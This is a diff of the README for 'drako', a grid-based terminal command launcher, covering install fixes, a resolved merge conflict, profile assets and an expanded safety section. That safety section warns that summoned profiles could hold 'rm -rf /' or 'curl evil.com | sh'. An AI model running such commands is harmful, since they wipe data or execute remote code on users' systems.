@@ -7,13 +7,14 @@ The terminal is a realm of immense power, but also of high entropy. Commands are
 
 > Requires Go **1.24** or newer.
 
-If Go is installed on your system, installing `drako` is a single command.
+If Go is installed, installing `drako` is a single command.
 
 ```bash
-go install github.com/lucky7xz/drako@latest 
+go install github.com/lucky7xz/drako@latest  # install drako
 ```
 
-### Installing Go
+### Install Go
+
 
 - macOS: `brew install go`
 - Arch: `sudo pacman -S go`
@@ -28,9 +29,8 @@ Run `drako`. On its first execution, it will construct your configuration file a
 To update `drako` to the latest version, simply run the installation command again.
 
 If you are not getting the latest version, use this command instead:
-
 ```bash
-GOPROXY=direct go install github.com/lucky/drako@latest
+GOPROXY=direct go install github.com/lucky7xz/drako/cmd/drako@latest  # install drako
 ```
 If newly added profiles do not appear after the update, note that `drako` only creates the bootstrap folder under .config/drako if there is none present alreay. As such, the new profiles will no be created. 
 
@@ -107,30 +107,17 @@ row = 1
 ```
 
 
+---
 
 ## ✨ Philosophy
 
 `drako` is built on a few core principles:
 
-<<<<<<< HEAD
--   **The Grid is Your Command Deck.** Your most vital commands are laid out on a visual grid for immediate, single-keypress access. No more searching shell history or forgotten aliases.
-
--   **Profiles are Shifting Forms.** A profile is a complete reconfiguration of the grid for a different context. Switch from a "DevOps" (`docker`, `ufw`) to a "Network Sentinel" deck (`nmap`, `mtr`) instantly.
-
--   **Your Deck is Portable.** The true power of profiles is their portability. By keeping your `profile` file directory in a Git repository, you can deploy your entire command center to a new server with a single command. This transforms `drako` into a declarative, repeatable control panel for any machine you manage.
-
--   **Harness, Don't Replace.** `drako` integrates with the tools you already use. If it runs in the terminal, it can be bound to the grid.
-
--   **The Power of TUI Decks:** For those who wish to build true terminal cathedrals, `drako` serves as the gateway to `para13`, a `TUI-Deck` build with seamless integration into `drako`. More will be revealed in time. Stay tuned
-
-
-=======
 -   **The Grid is Your Command Deck:** Commands are mapped to a visual grid for immediate, single-keypress access. It beats searching shell history or remembering aliases.
 -   **Profiles are Contexts:** A profile is a complete reconfiguration of the grid. Switch from a "Dev" deck (`go build`, `test`) to an "Ops" deck (`nmap`, `ssh`) instantly.
 -   **Portable Configuration:** Your entire setup lives in `~/.config/drako`. Git-manage your own profile folder and `summon` it with `drako summon`. You can deploy your exact control panel to any new machine in an instant.
 -   **Harness, Don't Replace:** It integrates with the tools you already use. If it runs in the terminal, it can be bound to the grid.
 ---
->>>>>>> 01310d8 (moved config and exported all)
 
 ## 🪄 Summoning Profiles
 
@@ -146,26 +133,37 @@ drako summon git@github.com:user/my_profile_collection.git
 
 Works with any Git host (GitHub, GitLab, self-hosted). Summoned profiles land in your inventory, validated for syntax before copying.
 
-If a profile needs extra files (scripts, configs), declare it under `assets = [" relative path / or / dir",...]`. `drako` will offer to copy those files alongside the profile, keeping their paths intact.
+If a profile needs extra files (scripts, configs), declare it under `assets = ["relative/path/to/file", ...]`.
+`drako` will copy these assets to `~/.config/drako/assets/<profile_name>/`.
+
+You can reference them in your commands using the `{assets}` token:
+```toml
+command = "python3 {assets}/scanner.py"
+```
+This ensures your profile is portable and works on any machine.
 
 ## ⚠️ Safety First
 
-- Only run commands you understand. Some entries perform system changes (e.g., package updates, Docker operations).
-- Review commands: press `e` to open the command description and read every command.
-- When unsure, consult documentation or ask a trusted friend/colleague.
+- **Summoning is a Trust Operation:** When you summon a profile, you are downloading code that `drako` will execute. A malicious profile could contain harmful commands (e.g., `rm -rf /`, `curl evil.com | sh`).
+    - **Review before running:** Always inspect the contents of a summoned profile (using `cat` or your editor) *before* you start using it.
+    - **Only summon from trusted sources:** Treat a profile URL like you would a binary executable.
+- **Understand the Commands:** Some entries perform system changes (e.g., package updates, Docker operations). Press `e` in the TUI to read the command description.
+- **When Unsure:** Consult documentation or ask a trusted friend/colleague.
 
 ## Roadmap 
 
  - [x] Update Bootstrap collection
  - [x] Summon profiles incl assets
- - [ ] DRY and Refactor  
+ - [x] DRY Refactor  
+ - [x] Grid Size Safety & Rescue Mode
+ - [x] Core Profile Concept
  - [ ] Full unit test suite
  - [ ] Windows support (limited)
  - [ ] Steamdeck support (limited)
  - [ ] ARM Support
  - [ ] CI/CD
 
-
+---
 
 ## 🤝 Contribution
 
@@ -174,7 +172,7 @@ Ideas are welcome. Bugs will be hunted.
 -   **Pull Requests:** Fork the repository and submit your work.
 -   **Alpha State:** `drako` is currently in ALPHA. It is stable but evolving. This is your opportunity to influence its development.
 
-
+---
 
 ## ❤️ Thanks to Charmbracelet
 
